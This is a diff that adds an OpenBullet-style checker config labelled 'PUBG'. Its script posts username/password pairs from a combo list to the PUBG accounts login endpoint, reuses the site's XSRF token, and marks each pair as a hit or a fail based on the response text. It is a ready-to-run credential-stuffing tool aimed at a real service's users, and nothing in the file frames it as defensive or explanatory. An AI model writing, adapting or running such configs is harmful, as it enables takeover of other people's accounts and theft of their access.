@@ -1,0 +1,46 @@
+[SETTINGS]
+{
+  "Name": "PUBG",
+  "SuggestedBots": 1,
+  "LastModified": "2019-04-03T16:04:43.1466083+02:00",
+  "AdditionalInfo": "",
+  "Author": "Lucky",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://accounts.pubg.com/auth/local" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+PARSE "<COOKIES(XSRF-TOKEN)>" LR "" "" -> VAR "TOKEN" 
+REQUEST POST "https://accounts.pubg.com/auth/local" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "XSRF-TOKEN: <TOKEN>" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "error.login-denied" 
+  KEYCHAIN Success OR 
+    KEY "login.success" 
